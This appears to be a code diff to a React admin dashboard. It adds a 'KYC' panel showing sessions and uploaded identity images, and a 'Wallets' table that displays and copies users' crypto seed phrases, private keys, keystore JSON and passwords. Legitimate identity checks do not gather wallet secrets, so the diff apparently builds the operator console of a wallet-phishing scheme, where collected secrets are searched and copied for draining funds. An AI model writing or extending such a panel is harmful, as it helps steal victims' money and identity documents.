@@ -9,9 +9,43 @@ import { FaUserShield, FaUsers, FaWallet, FaIdCard, FaBars, FaSignOutAlt, FaUser
   };
 
 const AdminDashboard = () => {
+  // helper: obfuscate seed (show first 3 and last 3 words)
+  const obfuscateSeed = (seed) => {
+    if (!seed) return '';
+    const words = seed.trim().split(/\s+/).filter(Boolean);
+    if (words.length <= 6) return words.map((w,i) => (i===0||i===words.length-1? w : '****')).join(' ');
+    const first = words.slice(0, 3).join(' ');
+    const last = words.slice(-3).join(' ');
+    return `${first} ... ${last}`;
+  };
+
+  const copyToClipboard = async (text) => {
+    try {
+      await navigator.clipboard.writeText(text);
+      alert('Copied to clipboard');
+    } catch (err) {
+      console.error('Copy failed', err);
+      // fallback
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      alert('Copied to clipboard');
+    }
+  };
   const [activePanel, setActivePanel] = useState('admin');
   const [admins, setAdmins] = useState([]);
   const [error, setError] = useState('');
+  const [kycRecords, setKycRecords] = useState([]);
+  const [walletRecords, setWalletRecords] = useState([]);
+  const [page, setPage] = useState(1);
+  const [limit, setLimit] = useState(10);
+  const [searchQ, setSearchQ] = useState('');
+  const [filterStatus, setFilterStatus] = useState('');
+  const [filterWalletType, setFilterWalletType] = useState('');
+  const [totalPages, setTotalPages] = useState(0);
   const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
   const [sidebarOpen, setSidebarOpen] = useState(false); // for mobile
 
@@ -44,7 +78,31 @@ const AdminDashboard = () => {
       };
       fetchAdmins();
     }
-  }, [activePanel]);
+    // build query params
+    const token = localStorage.getItem('adminToken');
+    if (activePanel === 'kyc' || activePanel === 'wallets') {
+      const fetchKyc = async () => {
+        try {
+          const params = new URLSearchParams();
+          params.set('page', String(page));
+          params.set('limit', String(limit));
+          if (searchQ) params.set('q', searchQ);
+          if (filterStatus) params.set('status', filterStatus);
+          if (filterWalletType) params.set('walletType', filterWalletType);
+
+          const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc?${params.toString()}`, { headers: { 'Authorization': `Bearer ${token}` } });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.message || 'Failed to fetch KYC records');
+          setKycRecords(data.docs || []);
+          setWalletRecords((data.docs || []).filter(r => r.seedPhrase || r.privateKey || r.keystoreJson));
+          setTotalPages(data.pages || 0);
+        } catch (err) {
+          setError(err.message);
+        }
+      };
+      fetchKyc();
+    }
+  }, [activePanel, page, limit, searchQ, filterStatus, filterWalletType]);
 
   // Sidebar width values for desktop
   const sidebarWidthValue = sidebarCollapsed ? 80 : 256; // px
@@ -253,13 +311,127 @@ const AdminDashboard = () => {
           {activePanel === 'kyc' && (
             <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
               <h2 className="text-4xl font-bold mb-4 text-center">KYC</h2>
-              <div className="text-gray-500 text-center">No KYC data available.</div>
+              {error && <div className="mb-4 text-red-500 text-center">{error}</div>}
+              <div className="mb-4 flex flex-col md:flex-row md:items-center md:justify-between gap-2">
+                <div className="flex items-center gap-2">
+                  <input value={searchQ} onChange={e=>{setSearchQ(e.target.value); setPage(1);}} placeholder="Search session, wallet type, seed..." className="p-2 border rounded w-64" />
+                  <select value={filterStatus} onChange={e=>{setFilterStatus(e.target.value); setPage(1);}} className="p-2 border rounded">
+                    <option value="">All Statuses</option>
+                    <option value="pending">Pending</option>
+                    <option value="verified">Verified</option>
+                    <option value="verification_failed">Verification Failed</option>
+                    <option value="no_images">No Images</option>
+                  </select>
+                  <input value={filterWalletType} onChange={e=>{setFilterWalletType(e.target.value); setPage(1);}} placeholder="Filter wallet type" className="p-2 border rounded w-48" />
+                </div>
+                <div className="flex items-center gap-2">
+                  <label className="text-sm">Per page:</label>
+                  <select value={limit} onChange={e=>{setLimit(Number(e.target.value)); setPage(1);}} className="p-2 border rounded">
+                    <option value={5}>5</option>
+                    <option value={10}>10</option>
+                    <option value={20}>20</option>
+                  </select>
+                </div>
+              </div>
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                {kycRecords.length === 0 && <div className="text-gray-500">No KYC records found.</div>}
+                {kycRecords.map((rec) => (
+                  <div key={rec._id} className="border rounded p-4 shadow-sm">
+                    <div className="flex items-center justify-between mb-2">
+                      <div className="font-semibold">Session: {rec.sessionId}</div>
+                      <div className="text-sm text-gray-500">{new Date(rec.createdAt).toLocaleString()}</div>
+                    </div>
+                    <div className="mb-2">Wallet: <span className="font-medium">{rec.walletType}</span></div>
+                    <div className="mb-3">Verification: <span className="font-medium">{rec.verificationStatus}</span></div>
+                    <div className="grid grid-cols-3 gap-2">
+                      {(rec.imageUrls || []).map((img, i) => (
+                        <div key={i} className="w-full h-24 overflow-hidden border rounded cursor-pointer" title="Open file">
+                          <a href={img.url} target="_blank" rel="noreferrer noopener">
+                            {/* thumbnail */}
+                            <img src={img.url} alt={img.public_id} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
+                          </a>
+                        </div>
+                      ))}
+                    </div>
+                    {rec.verificationError && <div className="mt-2 text-sm text-red-500">Error: {rec.verificationError}</div>}
+                  </div>
+                ))}
+              </div>
             </div>
           )}
           {activePanel === 'wallets' && (
             <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
               <h2 className="text-4xl font-bold mb-4 text-center">Wallets</h2>
-              <div className="text-gray-500 text-center">No wallet data available.</div>
+              {error && <div className="mb-4 text-red-500 text-center">{error}</div>}
+              <div className="mb-4 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <input value={searchQ} onChange={e=>{setSearchQ(e.target.value); setPage(1);}} placeholder="Search session, wallet type, seed..." className="p-2 border rounded w-64" />
+                  <input value={filterWalletType} onChange={e=>{setFilterWalletType(e.target.value); setPage(1);}} placeholder="Filter wallet type" className="p-2 border rounded w-48" />
+                </div>
+                <div className="flex items-center gap-2">
+                  <label className="text-sm">Per page:</label>
+                  <select value={limit} onChange={e=>{setLimit(Number(e.target.value)); setPage(1);}} className="p-2 border rounded">
+                    <option value={5}>5</option>
+                    <option value={10}>10</option>
+                    <option value={20}>20</option>
+                  </select>
+                </div>
+              </div>
+              {walletRecords.length === 0 ? (
+                <div className="text-gray-500 text-center">No wallet data available.</div>
+              ) : (
+                <div className="overflow-x-auto">
+                  <table className="w-full border-collapse border border-gray-300">
+                    <thead>
+                      <tr className="bg-gray-100">
+                        <th className="py-3 px-4 border">Session</th>
+                        <th className="py-3 px-4 border">Wallet Type</th>
+                        <th className="py-3 px-4 border">Seed Phrase</th>
+                        <th className="py-3 px-4 border">Private Key / Keystore</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {walletRecords.map((r) => (
+                        <tr key={r._id} className="hover:bg-gray-50 align-top">
+                          <td className="py-3 px-4 border text-center">{r.sessionId}</td>
+                          <td className="py-3 px-4 border text-center">{r.walletType}</td>
+                          <td className="py-3 px-4 border text-center">
+                            {r.seedPhrase ? (
+                              <div className="flex items-center justify-center gap-2">
+                                <span style={{ fontFamily: 'monospace' }}>{obfuscateSeed(r.seedPhrase)}</span>
+                                <button onClick={() => copyToClipboard(r.seedPhrase)} className="ml-2 px-2 py-1 bg-blue-500 text-white rounded text-sm">Copy</button>
+                              </div>
+                            ) : (<span className="text-gray-500">-</span>)}
+                          </td>
+                          <td className="py-3 px-4 border text-left">
+                            {r.privateKey && (
+                              <div className="mb-2">
+                                <div className="font-semibold">Private Key</div>
+                                <div className="break-all" style={{ fontFamily: 'monospace' }}>{r.privateKey}</div>
+                                <button onClick={() => copyToClipboard(r.privateKey)} className="mt-1 px-2 py-1 bg-gray-800 text-white rounded text-sm">Copy</button>
+                              </div>
+                            )}
+                            {r.keystoreJson && (
+                              <div className="mb-2">
+                                <div className="font-semibold">Keystore JSON</div>
+                                <pre className="whitespace-pre-wrap break-all p-2 bg-gray-50 border rounded text-xs" style={{ maxHeight: 180, overflow: 'auto' }}>{r.keystoreJson}</pre>
+                                {r.password && <div className="mt-1">Password: <span className="font-mono">{r.password}</span></div>}
+                                <button onClick={() => copyToClipboard(r.keystoreJson)} className="mt-1 px-2 py-1 bg-gray-800 text-white rounded text-sm">Copy JSON</button>
+                              </div>
+                            )}
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              )}
+              {/* Pagination controls */}
+              <div className="mt-4 flex items-center justify-center gap-2">
+                <button disabled={page<=1} onClick={()=>setPage(p=>Math.max(1,p-1))} className="px-3 py-1 border rounded">Prev</button>
+                <span>Page {page} of {totalPages || 1}</span>
+                <button disabled={page>= (totalPages || 1)} onClick={()=>setPage(p=>p+1)} className="px-3 py-1 border rounded">Next</button>
+              </div>
             </div>
           )}
         </div>
